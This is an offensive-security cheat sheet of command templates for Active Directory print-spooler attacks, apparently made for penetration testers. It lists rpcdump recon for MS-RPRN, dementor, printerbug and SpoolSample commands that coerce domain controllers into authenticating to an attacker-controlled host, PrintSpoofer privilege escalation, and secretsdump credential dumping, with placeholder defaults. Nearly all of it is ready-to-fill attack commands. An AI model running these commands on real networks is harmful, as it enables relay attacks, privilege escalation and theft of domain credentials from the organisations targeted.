# Printerbug

% printerbug, petitpotam, Active directory

## Finding Spooler services listening
#assessment/AD  #target/remote #cat/RECON 
```bash
rpcdump.py <domain>/<user>:'<password>'@<dc> | grep MS-RPRN
```

## Finding Spooler services anonymous
#assessment/AD  #target/remote #cat/RECON 
```bash
rpcdump.py <dc> | grep -A 6 MS-RPRN
```

## dementor
#assessment/AD  #target/remote #cat/ATTACK/EXPLOIT 
https://github.com/NotMedic/NetNTLMtoSilverTicket

```bash
dementor.py -d <domain> -u <user> -p <password> <attacker_ip> <dc2>
```

## printerbug
#assessment/AD  #target/remote #cat/ATTACK/EXPLOIT 
https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py

```bash
printerbug.py '<domain>/<user>:<password>'@<ip> <attacker_ip>
```

## webclientservicescanner
#assessment/AD  #target/remote #cat/RECON
https://github.com/Hackndo/WebclientServiceScanner

```bash
webclientservicescanner '<domain>/<user>:<password>'@<ip_range>
```

## secret dump with kerberos
#assessment/AD  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```bash
secretsdump -k <dc>
```

## Printspoofer privesc
#assessment/AD  #target/local #cat/ATTACK/EXPLOIT

https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/PrintSpoofer.NET

```bash
PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss <launch_cmd>
```

## Spoolsample launch pipe
#assessment/AD  #target/remote #cat/ATTACK/EXPLOIT
```bash
SpoolSample.exe <target_hostname> <target_hostname>/pipe/test
```

## Spoolsample
#assessment/AD  #target/remote #cat/ATTACK/EXPLOIT

Coerce authentication 

```bash
SpoolSample.exe <target_server> <capture_server> 
```


= user : anonymous
= pass : anonymous
= dc : DC01.domain.local
= dc1 : DC01.domain.local
= dc2 : DC02.domain.local
= computer_password : 123soleil
= ip_range : 192.168.1.0/24
